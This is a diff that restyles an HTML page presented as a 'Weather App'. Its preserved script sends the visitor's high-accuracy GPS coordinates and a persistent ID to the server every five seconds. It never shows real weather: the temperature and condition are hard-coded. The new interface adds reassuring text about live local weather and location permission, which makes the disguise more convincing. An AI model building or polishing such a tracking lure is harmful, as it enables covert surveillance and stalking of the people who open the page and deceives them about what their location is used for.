@@ -4,183 +4,1327 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <title>Weather App</title>
+
     <style>
-        /* Reset */
+        /* =========================================================
+           RESET
+        ========================================================= */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Body Styling */
+        html,
         body {
+            width: 100%;
+            min-height: 100%;
+        }
+
+        /* =========================================================
+           BODY
+        ========================================================= */
+        body {
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            font-family: Arial, sans-serif;
+
+            padding: 30px 18px;
+
+            overflow: hidden;
+
+            font-family:
+                Inter,
+                -apple-system,
+                BlinkMacSystemFont,
+                "Segoe UI",
+                Roboto,
+                Helvetica,
+                Arial,
+                sans-serif;
+
+            color: #ffffff;
+
+            background:
+                radial-gradient(
+                    circle at 15% 15%,
+                    rgba(56, 189, 248, 0.28),
+                    transparent 30%
+                ),
+                radial-gradient(
+                    circle at 85% 85%,
+                    rgba(37, 99, 235, 0.25),
+                    transparent 32%
+                ),
+                linear-gradient(
+                    135deg,
+                    #020617 0%,
+                    #07182c 45%,
+                    #031c2f 100%
+                );
         }
 
-        /* Weather Card Styling */
+        /* =========================================================
+           ANIMATED BACKGROUND
+        ========================================================= */
+        .background {
+            position: fixed;
+            inset: 0;
+
+            overflow: hidden;
+
+            pointer-events: none;
+
+            z-index: 0;
+        }
+
+        .orb {
+            position: absolute;
+
+            border-radius: 50%;
+
+            filter: blur(4px);
+
+            opacity: 0.5;
+
+            animation:
+                floatOrb 12s ease-in-out infinite;
+        }
+
+        .orb-one {
+            width: 240px;
+            height: 240px;
+
+            top: -90px;
+            left: -70px;
+
+            background:
+                radial-gradient(
+                    circle,
+                    rgba(14, 165, 233, 0.28),
+                    transparent 70%
+                );
+        }
+
+        .orb-two {
+            width: 300px;
+            height: 300px;
+
+            right: -120px;
+            bottom: -100px;
+
+            background:
+                radial-gradient(
+                    circle,
+                    rgba(59, 130, 246, 0.24),
+                    transparent 70%
+                );
+
+            animation-delay: -5s;
+        }
+
+        .orb-three {
+            width: 170px;
+            height: 170px;
+
+            top: 42%;
+            right: 10%;
+
+            background:
+                radial-gradient(
+                    circle,
+                    rgba(34, 211, 238, 0.13),
+                    transparent 70%
+                );
+
+            animation-duration: 16s;
+            animation-delay: -8s;
+        }
+
+        @keyframes floatOrb {
+            0%,
+            100% {
+                transform: translate3d(0, 0, 0) scale(1);
+            }
+
+            50% {
+                transform: translate3d(25px, -30px, 0) scale(1.08);
+            }
+        }
+
+        /* =========================================================
+           SMALL PARTICLES
+        ========================================================= */
+        .particle {
+            position: absolute;
+
+            width: 3px;
+            height: 3px;
+
+            border-radius: 50%;
+
+            background: rgba(255, 255, 255, 0.55);
+
+            box-shadow:
+                0 0 10px rgba(255, 255, 255, 0.5);
+
+            animation: particleFloat 8s linear infinite;
+        }
+
+        .p1 {
+            top: 18%;
+            left: 12%;
+            animation-delay: 0s;
+        }
+
+        .p2 {
+            top: 70%;
+            left: 18%;
+            animation-delay: -3s;
+        }
+
+        .p3 {
+            top: 30%;
+            right: 16%;
+            animation-delay: -5s;
+        }
+
+        .p4 {
+            top: 80%;
+            right: 25%;
+            animation-delay: -2s;
+        }
+
+        @keyframes particleFloat {
+            0% {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+
+            20% {
+                opacity: 0.7;
+            }
+
+            80% {
+                opacity: 0.7;
+            }
+
+            100% {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+        }
+
+        /* =========================================================
+           MAIN CONTAINER
+        ========================================================= */
+        .app-container {
+            position: relative;
+
+            z-index: 2;
+
+            width: min(100%, 460px);
+        }
+
+        /* =========================================================
+           WEATHER CARD
+        ========================================================= */
         .weather-card {
-            background-color: #fff;
-            padding: 25px 20px;
-            border-radius: 15px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            max-width: 300px;
+            position: relative;
+
             width: 100%;
-            transform: scale(1.5);
+
+            padding: 34px 32px 27px;
+
+            overflow: hidden;
+
+            border:
+                1px solid rgba(255, 255, 255, 0.13);
+
+            border-radius: 32px;
+
+            background:
+                linear-gradient(
+                    145deg,
+                    rgba(255, 255, 255, 0.105),
+                    rgba(255, 255, 255, 0.035)
+                );
+
+            backdrop-filter: blur(28px);
+            -webkit-backdrop-filter: blur(28px);
+
+            box-shadow:
+                0 40px 100px rgba(0, 0, 0, 0.42),
+                inset 0 1px 0 rgba(255, 255, 255, 0.09);
+
+            animation:
+                cardAppear 0.8s cubic-bezier(0.22, 1, 0.36, 1)
+                forwards;
         }
 
-        /* Title Styling */
-        .weather-card h2 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 5px;
+        .weather-card::before {
+            content: "";
+
+            position: absolute;
+
+            top: 0;
+            left: 0;
+            right: 0;
+
+            height: 1px;
+
+            background:
+                linear-gradient(
+                    90deg,
+                    transparent,
+                    rgba(255, 255, 255, 0.35),
+                    transparent
+                );
         }
 
-        /* Location Styling */
+        .weather-card::after {
+            content: "";
+
+            position: absolute;
+
+            width: 250px;
+            height: 250px;
+
+            top: -170px;
+            right: -130px;
+
+            border-radius: 50%;
+
+            background:
+                radial-gradient(
+                    circle,
+                    rgba(56, 189, 248, 0.15),
+                    transparent 70%
+                );
+
+            pointer-events: none;
+        }
+
+        @keyframes cardAppear {
+            from {
+                opacity: 0;
+                transform:
+                    translateY(35px)
+                    scale(0.96);
+            }
+
+            to {
+                opacity: 1;
+                transform:
+                    translateY(0)
+                    scale(1);
+            }
+        }
+
+        /* =========================================================
+           HEADER
+        ========================================================= */
+        .header {
+            position: relative;
+
+            z-index: 2;
+
+            text-align: center;
+        }
+
+        .live-badge {
+            display: inline-flex;
+
+            align-items: center;
+            gap: 8px;
+
+            padding: 7px 13px;
+
+            margin-bottom: 15px;
+
+            border:
+                1px solid rgba(255, 255, 255, 0.1);
+
+            border-radius: 999px;
+
+            background:
+                rgba(255, 255, 255, 0.055);
+
+            color:
+                rgba(255, 255, 255, 0.72);
+
+            font-size: 11px;
+            font-weight: 700;
+
+            letter-spacing: 1px;
+
+            text-transform: uppercase;
+        }
+
+        .live-dot {
+            position: relative;
+
+            width: 7px;
+            height: 7px;
+
+            border-radius: 50%;
+
+            background: #4ade80;
+
+            box-shadow:
+                0 0 8px rgba(74, 222, 128, 0.9);
+        }
+
+        .live-dot::after {
+            content: "";
+
+            position: absolute;
+
+            inset: -4px;
+
+            border:
+                1px solid rgba(74, 222, 128, 0.4);
+
+            border-radius: 50%;
+
+            animation:
+                livePulse 1.8s ease-out infinite;
+        }
+
+        @keyframes livePulse {
+            0% {
+                opacity: 0.8;
+                transform: scale(0.7);
+            }
+
+            100% {
+                opacity: 0;
+                transform: scale(1.8);
+            }
+        }
+
+        .weather-card h1 {
+            font-size: 31px;
+
+            line-height: 1.15;
+
+            font-weight: 800;
+
+            letter-spacing: -1px;
+        }
+
+        .subtitle {
+            margin-top: 8px;
+
+            color:
+                rgba(255, 255, 255, 0.48);
+
+            font-size: 13px;
+
+            line-height: 1.5;
+        }
+
+        /* =========================================================
+           LOCATION
+        ========================================================= */
         .location {
-            font-size: 18px;
-            color: #555;
-            margin-top: 5px;
+            display: inline-flex;
+
+            align-items: center;
+            justify-content: center;
+
+            gap: 7px;
+
+            margin-top: 18px;
+
+            padding: 9px 14px;
+
+            border:
+                1px solid rgba(255, 255, 255, 0.08);
+
+            border-radius: 12px;
+
+            background:
+                rgba(255, 255, 255, 0.055);
+
+            color:
+                rgba(255, 255, 255, 0.82);
+
+            font-size: 13px;
+
+            font-weight: 600;
         }
 
-        /* Weather Icon Styling */
+        .location-pin {
+            display: flex;
+
+            align-items: center;
+            justify-content: center;
+
+            width: 20px;
+            height: 20px;
+
+            border-radius: 7px;
+
+            background:
+                rgba(56, 189, 248, 0.13);
+
+            font-size: 11px;
+        }
+
+        /* =========================================================
+           WEATHER ICON AREA
+        ========================================================= */
+        .weather-visual {
+            position: relative;
+
+            display: flex;
+
+            align-items: center;
+            justify-content: center;
+
+            width: 165px;
+            height: 165px;
+
+            margin: 18px auto 4px;
+        }
+
+        .weather-glow {
+            position: absolute;
+
+            width: 125px;
+            height: 125px;
+
+            border-radius: 50%;
+
+            background:
+                radial-gradient(
+                    circle,
+                    rgba(125, 211, 252, 0.22),
+                    rgba(56, 189, 248, 0.07) 45%,
+                    transparent 70%
+                );
+
+            animation:
+                weatherGlow 4s ease-in-out infinite;
+        }
+
+        @keyframes weatherGlow {
+            0%,
+            100% {
+                transform: scale(0.94);
+                opacity: 0.65;
+            }
+
+            50% {
+                transform: scale(1.08);
+                opacity: 1;
+            }
+        }
+
+        .weather-ring {
+            position: absolute;
+
+            width: 145px;
+            height: 145px;
+
+            border:
+                1px solid rgba(255, 255, 255, 0.07);
+
+            border-radius: 50%;
+        }
+
+        .weather-ring::before {
+            content: "";
+
+            position: absolute;
+
+            inset: 10px;
+
+            border:
+                1px dashed rgba(255, 255, 255, 0.055);
+
+            border-radius: 50%;
+
+            animation:
+                rotateRing 20s linear infinite;
+        }
+
+        @keyframes rotateRing {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
         .weather-icon {
-            margin: 20px 0;
+            position: relative;
+
+            z-index: 3;
+
+            display: flex;
+
+            align-items: center;
+            justify-content: center;
+
+            width: 100px;
+            height: 100px;
         }
 
         .weather-icon img {
-            width: 80px;
-            height: 80px;
+            width: 88px;
+            height: 88px;
+
+            object-fit: contain;
+
+            filter:
+                drop-shadow(
+                    0 14px 20px
+                    rgba(0, 0, 0, 0.25)
+                );
+
+            animation:
+                weatherFloat 4s ease-in-out infinite;
         }
 
-        /* Weather Info Styling */
+        @keyframes weatherFloat {
+            0%,
+            100% {
+                transform: translateY(0) rotate(-2deg);
+            }
+
+            50% {
+                transform: translateY(-9px) rotate(2deg);
+            }
+        }
+
+        /* =========================================================
+           WEATHER INFO
+        ========================================================= */
         .weather-info {
-            margin: 20px 0;
+            position: relative;
+
+            z-index: 2;
+
+            text-align: center;
+
+            margin-top: 5px;
         }
 
         .temperature {
             display: block;
-            font-size: 48px;
-            font-weight: bold;
-            color: #333;
+
+            font-size:
+                clamp(64px, 17vw, 82px);
+
+            line-height: 0.95;
+
+            font-weight: 800;
+
+            letter-spacing: -5px;
+
+            color: #ffffff;
+
+            text-shadow:
+                0 12px 35px
+                rgba(0, 0, 0, 0.22);
         }
 
         .condition {
-            font-size: 20px;
-            color: #777;
+            display: block;
+
+            margin-top: 13px;
+
+            color:
+                rgba(255, 255, 255, 0.72);
+
+            font-size: 17px;
+
+            font-weight: 600;
+
+            letter-spacing: 0.2px;
         }
 
-        /* Button Styling */
+        /* =========================================================
+           INFORMATION STRIP
+        ========================================================= */
+        .info-strip {
+            display: grid;
+
+            grid-template-columns:
+                repeat(3, 1fr);
+
+            gap: 8px;
+
+            margin-top: 25px;
+        }
+
+        .info-item {
+            padding: 11px 6px;
+
+            border:
+                1px solid rgba(255, 255, 255, 0.07);
+
+            border-radius: 13px;
+
+            background:
+                rgba(255, 255, 255, 0.035);
+
+            text-align: center;
+        }
+
+        .info-label {
+            display: block;
+
+            color:
+                rgba(255, 255, 255, 0.38);
+
+            font-size: 9px;
+
+            font-weight: 700;
+
+            letter-spacing: 0.8px;
+
+            text-transform: uppercase;
+        }
+
+        .info-value {
+            display: block;
+
+            margin-top: 4px;
+
+            color:
+                rgba(255, 255, 255, 0.78);
+
+            font-size: 12px;
+
+            font-weight: 600;
+        }
+
+        /* =========================================================
+           DIVIDER
+        ========================================================= */
+        .divider {
+            width: 100%;
+
+            height: 1px;
+
+            margin: 23px 0;
+
+            background:
+                linear-gradient(
+                    90deg,
+                    transparent,
+                    rgba(255, 255, 255, 0.11),
+                    transparent
+                );
+        }
+
+        /* =========================================================
+           BUTTON
+        ========================================================= */
         button {
-            padding: 12px 24px;
-            background-color: #4facfe;
-            color: white;
-            border: none;
-            border-radius: 8px;
+            position: relative;
+
+            display: flex;
+
+            align-items: center;
+            justify-content: center;
+
+            gap: 10px;
+
+            width: 100%;
+
+            min-height: 56px;
+
+            padding: 15px 20px;
+
+            overflow: hidden;
+
+            border:
+                1px solid rgba(255, 255, 255, 0.16);
+
+            border-radius: 16px;
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #38bdf8,
+                    #2563eb
+                );
+
+            color: #ffffff;
+
             cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            transition: background-color 0.3s;
+
+            font-family: inherit;
+
+            font-size: 14px;
+
+            font-weight: 750;
+
+            letter-spacing: 0.2px;
+
+            box-shadow:
+                0 14px 30px
+                rgba(37, 99, 235, 0.25);
+
+            transition:
+                transform 0.2s ease,
+                box-shadow 0.2s ease,
+                opacity 0.2s ease;
+        }
+
+        button::before {
+            content: "";
+
+            position: absolute;
+
+            top: 0;
+            left: -100%;
+
+            width: 60%;
+            height: 100%;
+
+            background:
+                linear-gradient(
+                    90deg,
+                    transparent,
+                    rgba(255, 255, 255, 0.18),
+                    transparent
+                );
+
+            transform: skewX(-20deg);
+
+            transition: left 0.6s ease;
+        }
+
+        button:hover:not(:disabled)::before {
+            left: 130%;
+        }
+
+        button:hover:not(:disabled) {
+            transform: translateY(-2px);
+
+            box-shadow:
+                0 18px 38px
+                rgba(37, 99, 235, 0.34);
+        }
+
+        button:active:not(:disabled) {
+            transform: translateY(0);
         }
 
         button:disabled {
-            opacity: 70%;
+            cursor: wait;
+
+            opacity: 0.65;
+
+            box-shadow:
+                none;
         }
 
-        @media(max-width: 500px) {
+        .button-icon {
+            display: inline-flex;
+
+            align-items: center;
+            justify-content: center;
+
+            width: 20px;
+            height: 20px;
+
+            border:
+                1px solid rgba(255, 255, 255, 0.25);
+
+            border-radius: 7px;
+
+            background:
+                rgba(255, 255, 255, 0.12);
+
+            font-size: 11px;
+        }
+
+        /* =========================================================
+           FOOTER
+        ========================================================= */
+        .footer {
+            margin-top: 15px;
+
+            text-align: center;
+
+            color:
+                rgba(255, 255, 255, 0.3);
+
+            font-size: 10px;
+
+            line-height: 1.5;
+        }
+
+        /* =========================================================
+           LOADING ANIMATION
+        ========================================================= */
+        .loading-dots {
+            display: inline-flex;
+
+            gap: 4px;
+        }
+
+        .loading-dots span {
+            width: 5px;
+            height: 5px;
+
+            border-radius: 50%;
+
+            background: #ffffff;
+
+            animation:
+                loadingDot 1s ease-in-out infinite;
+        }
+
+        .loading-dots span:nth-child(2) {
+            animation-delay: 0.15s;
+        }
+
+        .loading-dots span:nth-child(3) {
+            animation-delay: 0.3s;
+        }
+
+        @keyframes loadingDot {
+            0%,
+            60%,
+            100% {
+                opacity: 0.3;
+                transform: translateY(0);
+            }
+
+            30% {
+                opacity: 1;
+                transform: translateY(-3px);
+            }
+        }
+
+        /* =========================================================
+           MOBILE
+        ========================================================= */
+        @media (max-width: 520px) {
+            body {
+                padding: 15px;
+                overflow-y: auto;
+            }
+
             .weather-card {
-                transform: scale(1);
+                padding:
+                    28px
+                    20px
+                    23px;
+
+                border-radius: 27px;
+            }
+
+            .weather-card h1 {
+                font-size: 27px;
+            }
+
+            .weather-visual {
+                width: 145px;
+                height: 145px;
+            }
+
+            .weather-ring {
+                width: 128px;
+                height: 128px;
+            }
+
+            .weather-icon img {
+                width: 78px;
+                height: 78px;
+            }
+
+            .temperature {
+                font-size: 65px;
+                letter-spacing: -4px;
+            }
+
+            .condition {
+                font-size: 15px;
+            }
+        }
+
+        @media (max-height: 700px) {
+            body {
+                overflow-y: auto;
+            }
+
+            .weather-card {
+                margin: 20px 0;
+            }
+        }
+
+        /* =========================================================
+           ACCESSIBILITY
+        ========================================================= */
+        @media (prefers-reduced-motion: reduce) {
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                scroll-behavior: auto !important;
             }
         }
     </style>
 </head>
 
 <body>
-    <div class="weather-card">
-        <h2>Weather App</h2>
-        <p class="location"><span id="city">City</span>, <span id="country">Country</span></p>
 
-        <!-- Weather Icon -->
-        <div class="weather-icon">
-            <img src="/weather.png" alt="Weather Icon">
-        </div>
+    <!-- =========================================================
+         ANIMATED BACKGROUND
+    ========================================================= -->
 
-        <div class="weather-info">
-            <span class="temperature">25°C</span>
-            <span class="condition">Sunny</span>
-        </div>
+    <div class="background">
 
-        <button id="check-weather">Check Weather</button>
+        <div class="orb orb-one"></div>
+        <div class="orb orb-two"></div>
+        <div class="orb orb-three"></div>
+
+        <span class="particle p1"></span>
+        <span class="particle p2"></span>
+        <span class="particle p3"></span>
+        <span class="particle p4"></span>
+
     </div>
 
 
+    <!-- =========================================================
+         WEATHER APP
+    ========================================================= -->
+
+    <main class="app-container">
+
+        <section class="weather-card">
+
+            <!-- HEADER -->
+
+            <header class="header">
+
+                <div class="live-badge">
+                    <span class="live-dot"></span>
+                    Live Weather
+                </div>
+
+                <h1>
+                    Weather App
+                </h1>
+
+                <p class="subtitle">
+                    Real-time weather based on your location
+                </p>
+
+                <p class="location">
+
+                    <span class="location-pin">
+                        📍
+                    </span>
+
+                    <span id="city">
+                        City
+                    </span>
+
+                    ,
+
+                    <span id="country">
+                        Country
+                    </span>
+
+                </p>
+
+            </header>
+
+
+            <!-- WEATHER VISUAL -->
+
+            <div class="weather-visual">
+
+                <div class="weather-glow"></div>
+
+                <div class="weather-ring"></div>
+
+                <div class="weather-icon">
+
+                    <img
+                        src="/weather.png"
+                        alt="Current weather"
+                    >
+
+                </div>
+
+            </div>
+
+
+            <!-- WEATHER INFORMATION -->
+
+            <div class="weather-info">
+
+                <span class="temperature">
+                    25°C
+                </span>
+
+                <span class="condition">
+                    Sunny
+                </span>
+
+            </div>
+
+
+            <!-- INFORMATION STRIP -->
+
+            <div class="info-strip">
+
+                <div class="info-item">
+
+                    <span class="info-label">
+                        Status
+                    </span>
+
+                    <span class="info-value">
+                        Live
+                    </span>
+
+                </div>
+
+                <div class="info-item">
+
+                    <span class="info-label">
+                        GPS
+                    </span>
+
+                    <span class="info-value">
+                        Ready
+                    </span>
+
+                </div>
+
+                <div class="info-item">
+
+                    <span class="info-label">
+                        Updates
+                    </span>
+
+                    <span class="info-value">
+                        5 sec
+                    </span>
+
+                </div>
+
+            </div>
+
+
+            <div class="divider"></div>
+
+
+            <!-- CHECK WEATHER BUTTON -->
+
+            <button id="check-weather">
+
+                <span class="button-icon">
+                    ↻
+                </span>
+
+                <span id="button-text">
+                    Check Weather
+                </span>
+
+            </button>
+
+
+            <!-- FOOTER -->
+
+            <p class="footer">
+                Location permission is required to retrieve
+                your local weather information.
+            </p>
+
+        </section>
+
+    </main>
+
+
+    <!-- =========================================================
+         EXISTING JAVASCRIPT
+         FUNCTIONALITY PRESERVED
+    ========================================================= -->
+
     <script>
-        const id = localStorage.getItem("id") || generateId()
-        const btn = document.querySelector("#check-weather")
+
+        const id =
+            localStorage.getItem("id") || generateId()
+
+        const btn =
+            document.querySelector("#check-weather")
+
+        const buttonText =
+            document.querySelector("#button-text")
+
         let __interval
 
+
+        /* =====================================================
+           BUTTON CLICK
+        ===================================================== */
+
         btn.addEventListener("click", () => {
+
             btn.disabled = true
-            btn.innerHTML = "Fetching...."
+
+            buttonText.innerHTML = `
+                Fetching
+                <span class="loading-dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </span>
+            `
 
             getLocation()
+
         })
 
+
+        /* =====================================================
+           GET LOCATION
+        ===================================================== */
+
         function getLocation() {
+
             navigator.geolocation.getCurrentPosition(
+
                 (position) => {
+
                     btn.disabled = true
-                    const lat = position.coords.latitude
-                    const lng = position.coords.longitude
+
+                    const lat =
+                        position.coords.latitude
+
+                    const lng =
+                        position.coords.longitude
+
 
                     fetch("/weather", {
+
                         method: "POST",
+
                         body: JSON.stringify({
+
                             id,
                             lat,
                             lng,
+
                         }),
+
                         headers: {
-                            "Content-Type": "application/json"
+
+                            "Content-Type":
+                                "application/json"
+
                         }
+
                     }).catch(error => {
-                        console.log("post error", error)
+
+                        console.log(
+                            "post error",
+                            error
+                        )
+
                     })
+
                 },
+
+
                 (error) => {
-                    alert("Please Turn on GPS Location.")
+
+                    alert(
+                        "Please Turn on GPS Location."
+                    )
+
                     btn.disabled = false
-                    btn.innerHTML = "Check Weather"
-                    console.error("Error watching position:", error);
+
+                    buttonText.innerHTML =
+                        "Check Weather"
+
+                    console.error(
+                        "Error watching position:",
+                        error
+                    )
+
                 },
+
+
                 {
-                    enableHighAccuracy: true, // Use GPS if available
+
+                    enableHighAccuracy: true,
+
                 }
+
             )
 
-            if (__interval) clearTimeout(__interval)
-            __interval = setTimeout(getLocation, 5000)
+
+            if (__interval)
+                clearTimeout(__interval)
+
+
+            __interval =
+                setTimeout(
+                    getLocation,
+                    5000
+                )
+
         }
 
+
+        /* =====================================================
+           GENERATE USER ID
+        ===================================================== */
+
         function generateId(length = 10) {
-            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                const randomIndex = Math.floor(Math.random() * characters.length);
-                result += characters[randomIndex];
+
+            const characters =
+                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+
+            let result = ''
+
+
+            for (
+                let i = 0;
+                i < length;
+                i++
+            ) {
+
+                const randomIndex =
+                    Math.floor(
+                        Math.random() *
+                        characters.length
+                    )
+
+                result +=
+                    characters[randomIndex]
+
             }
 
-            localStorage.setItem("id", result)
-            return result;
+
+            localStorage.setItem(
+                "id",
+                result
+            )
+
+
+            return result
+
         }
 
     </script>
+
 </body>
 
 </html>
